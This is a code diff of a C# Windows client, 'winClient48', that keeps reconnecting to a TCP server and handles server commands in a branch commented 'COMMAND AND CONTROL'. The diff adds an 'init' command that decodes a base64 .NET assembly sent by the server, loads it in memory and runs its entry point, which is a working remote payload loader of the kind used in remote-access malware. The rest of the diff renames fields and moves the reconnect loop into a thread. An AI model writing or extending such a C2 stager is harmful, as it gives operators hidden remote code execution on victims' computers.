@@ -37,14 +37,14 @@ namespace winClient48
 {
     public partial class Form1 : Form
     {
-        private Socket g_Socket;
-        private bool g_bConnected = false;
+        private Socket m_Socket;
+        private bool m_bConnected = false;
 
-        private string g_szIPAddr = "127.0.0.1";
-        private int g_nPort = 5000;
+        private string m_szIPAddr = "127.0.0.1";
+        private int m_nPort = 5000;
 
-        private int g_nTimeout = 10000; //ms
-        private int g_nRetry = 10000; //ms
+        private int m_nTimeout = 10000; //ms
+        private int m_nRetry = 10000; //ms
 
         public Form1()
         {
@@ -62,45 +62,6 @@ namespace winClient48
             }
 
             return bytes;
-        }
-        private byte[] StructToBytes<T>(T structure) where T : struct
-        {
-            int size = Marshal.SizeOf(typeof(T));
-            byte[] buffer = new byte[size];
-            IntPtr ptr = Marshal.AllocHGlobal(size);
-
-            try
-            {
-                Marshal.StructureToPtr(structure, ptr, false);
-                Marshal.Copy(ptr, buffer, 0, size);
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(ptr);
-            }
-
-            return buffer;
-        }
-        private T BytesToStruct<T>(byte[] buffer) where T : struct
-        {
-            int size = Marshal.SizeOf(typeof(T));
-            if (buffer.Length != size)
-            {
-                throw new ArgumentException("Byte array size does not match the size of the structure.");
-            }
-
-            IntPtr ptr = Marshal.AllocHGlobal(size);
-
-            try
-            {
-                Marshal.Copy(buffer, 0, ptr, size);
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(ptr);
-            }
-
-            return Marshal.PtrToStructure<T>(ptr);
         }
 
         void ReceivedBuffer(Server s)
@@ -168,7 +129,7 @@ namespace winClient48
                                 }
                                 else if (dsp.Param == 4)
                                 {
-                                    //new Thread(() => SendInfo(v)).Start();
+                                    s.Send(3, 0, "Hello");
                                 }
                             }
                             else if (dsp.Command == 2) //COMMAND AND CONTROL
@@ -187,14 +148,20 @@ namespace winClient48
                         }
                     }
                 }
-                while (recv_len > 0 && g_bConnected);
+                while (recv_len > 0 && m_bConnected);
             }
             catch (Exception ex)
             {
-                g_bConnected = false;
+                m_bConnected = false;
                 return;
             }
         }
+
+        void fnInit()
+        {
+
+        }
+
         void CommandProc(Server s, string szPayload)
         {
             string[] aCmd = szPayload.Split('|');
@@ -208,6 +175,21 @@ namespace winClient48
                 {
 
                 }
+            }
+            else if (aCmd[0] == "init")
+            {
+                string[] aszData = clsEZData.fnStrToListStr(aCmd[1]).ToArray();
+                byte[] abExeBytes = Convert.FromBase64String(aCmd[2]);
+
+                Assembly loaded = Assembly.Load(abExeBytes);
+                MethodInfo entry = loaded.EntryPoint;
+                object instance = null;
+                if (!entry.IsStatic)
+                    instance = loaded.CreateInstance(entry.Name);
+
+                entry.Invoke(instance, new object[] { aszData });
+
+                s.socket.Close();
             }
         }
 
@@ -225,14 +207,14 @@ namespace winClient48
             try
             {
                 Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                sock.ReceiveTimeout = sock.SendTimeout = g_nTimeout;
+                sock.ReceiveTimeout = sock.SendTimeout = m_nTimeout;
                 sock.Connect(new IPEndPoint(IPAddress.Parse(szIPAddr), nPort));
 
                 Server s = new Server(sock);
                 new Thread(() => ReceivedBuffer(s)).Start();
-                g_bConnected = true;
+                m_bConnected = true;
 
-                g_Socket = sock;
+                m_Socket = sock;
 
                 return true;
             }
@@ -244,16 +226,19 @@ namespace winClient48
 
         void Main()
         {
-            g_bConnected = false;
-            while (true)
+            m_bConnected = false;
+            new Thread(() =>
             {
-                if (!g_bConnected)
+                while (true)
                 {
-                    g_bConnected = Connect(g_szIPAddr, g_nPort);
-                }
+                    if (!m_bConnected)
+                    {
+                        m_bConnected = Connect(m_szIPAddr, m_nPort);
+                    }
 
-                Thread.Sleep(g_nRetry);
-            }
+                    Thread.Sleep(m_nRetry);
+                }
+            }).Start();
         }
 
         private void Form1_Load(object sender, EventArgs e)
